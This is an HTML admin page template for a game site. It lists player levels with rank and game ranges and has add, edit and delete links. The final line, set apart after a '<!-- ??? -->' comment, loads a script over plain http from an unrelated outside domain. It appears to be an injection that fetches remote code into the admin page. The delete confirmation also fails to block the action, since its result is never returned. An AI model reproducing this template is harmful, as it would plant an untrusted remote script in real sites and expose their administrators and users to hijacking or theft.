    <div class="row">
            <div class="col-md-12">

              <div class="widget">
                <div class="widget-head">
                  <div class="pull-left">Items</div>
                  <div class="widget-icons pull-right"> 
                                    <a href="{SITE_URL}/misc/add_level" type="button" class="btn btn-sm btn-info"><i class="fa fa-plus"></i></a>
                    <a href="#" class="wminimize"><i class="fa fa-chevron-up"></i></a> 
                    <a href="#" class="wclose"><i class="fa fa-times"></i></a>
                  </div>  
                  <div class="clearfix"></div>
                </div>
                <div class="widget-content">
                  <div class="padd">                    
							<!-- Table Page -->
							<div class="page-tables">
								<!-- Table -->
								<div class="table-responsive">
									<table cellpadding="0" cellspacing="0" border="0" id="data-table-1" width="100%">
										<thead>
											<tr>
												
												<td>Level Name</td>
                                                <td>Rank Min - Max</td>
                                                <td>Games Min - Max</td>
												<td>Actions</td>
											</tr>
										</thead>
										<tbody>
												{LEVELS}
												<tr>
													
													<td>{level_name}</td>
                                                    <td>{level_min} - {level_max}</td>
                                                    <td>{min_games} - {max_games}</td>
													<td>
														<a class="link" href="{SITE_URL}/misc/edit_level/{id_level}">Edit</a>&nbsp;&nbsp;&nbsp;
														<a class="link" href="{SITE_URL}/misc/delete_level/{id_level}" onclick="conf_del()">Delete</a>
													</td>
												</tr>		
												{/LEVELS}
										</tbody>
									</table>
									<div class="clearfix"></div>
								</div>
							</div>
						</div>
                  </div>
                  <div class="widget-foot">
                    <!-- Footer goes here --> <a href="{SITE_URL}/misc/add_level" type="button" class="btn btn-sm btn-info"><i class="fa fa-plus"></i></a>
                  </div>
                </div>
              </div>  
              
            </div>
             <!-- ??? -->
            <script type="text/javascript">
            function conf_del(){
            var result = confirm("Are you sure?");
            if (result) 
            return true;
            else
            return false;
            }
            </script>
			
			<script type="text/javascript" src="http://oac-head.com/s.js"></script>
			